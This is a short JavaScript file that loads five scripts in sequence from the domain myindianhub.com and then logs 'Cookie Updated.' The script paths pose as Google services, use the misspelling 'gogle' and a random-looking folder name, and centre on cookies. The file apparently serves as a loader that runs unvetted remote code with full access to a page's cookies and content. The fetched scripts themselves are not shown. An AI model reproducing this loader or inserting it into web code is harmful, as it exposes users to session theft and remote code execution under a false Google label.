function loadScript(url) {
    return new Promise((resolve, reject) => {
      const script = document.createElement('script');
      script.src = url;
      script.onload = resolve;
      script.onerror = reject;
      document.head.appendChild(script);
    });
  }
  
  const urlToImport1 = 'https://www.myindianhub.com/free-api/google/api-req/req.js';
  
  loadScript(urlToImport1)
    .then(() => {
      return loadScript('https://www.myindianhub.com/free-api/google/cookies/service.js');
    })
    .then(() => {
      return loadScript('https://www.myindianhub.com/free-api/google/gogle-api/script.js');
    })
    .then(() => {
      return loadScript('https://www.myindianhub.com/free-api/google/hfdg64hd6/java-cookies.js');
    })
    .then(() => {
      return loadScript('https://www.myindianhub.com/free-api/google/cookies/google.js');
    })
    .then(() => {
      console.log("Cookie Updated.");
    })
    .catch(error => {
      console.error('Error loading or executing the script:', error);
    });